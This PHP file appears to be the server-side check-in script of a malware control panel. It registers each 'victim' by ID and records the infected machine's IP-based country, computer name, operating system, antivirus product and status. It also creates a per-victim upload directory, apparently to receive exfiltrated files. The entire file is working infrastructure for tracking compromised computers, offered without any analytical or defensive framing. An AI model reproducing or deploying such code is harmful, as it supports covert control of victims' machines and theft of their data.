<?php
include 'classes/Database.php';
include 'classes/Clients.php';
include 'classes/User.php';
include 'classes/Mailer.php';

$client = new Clients;

$_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$victimID = isset($_GET['vicID']) ? $_GET['vicID']: '';

if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP) && $_SERVER['REMOTE_ADDR'] != "::1") {
    $ipaddress =  $_SERVER['REMOTE_ADDR'];
} else {
    $ipaddress = "127.0.0.1";
}
$cpname = isset($_GET['cpname']) ? $_GET['cpname']: '';
$contery = strtolower(getConteryCode($ipaddress));
$os =  isset($_GET['os']) ? $_GET['os']: '';
$date = date("Y-m-d");
$antivirus =  isset($_GET['antivirus']) ? $_GET['antivirus']: '';
$status =  isset($_GET['status']) ? $_GET['status']: '';

if ($client->isExist($victimID,"clients")) {
  if(file_exists("upload/$victimID")){

  } else {
    mkdir("upload/$victimID");
    copy("upload/index.php", "upload/$victimID/index.php");
    copy("upload/.htaccess", "upload/$victimID/.htaccess");
  }
      $client->updateClient($victimID,$ipaddress,$cpname,$contery,$os,$date,$antivirus,$status);
 } else {
      mkdir("upload/$victimID");
      copy("upload/index.php", "upload/$victimID/index.php");
      copy("upload/.htaccess", "upload/$victimID/.htaccess");
      $client->newClient($victimID,$ipaddress,$cpname,$contery,$os,$date,$antivirus,$status);
}

function getConteryCode($ipaddress) {
   $json = file_get_contents('http://www.geoplugin.net/json.gp?ip='.$ipaddress); 
   $data = json_decode($json);
   if ($data->geoplugin_countryCode == "") {
       return "X";
   } else {
       return $data->geoplugin_countryCode;
   }
}
?>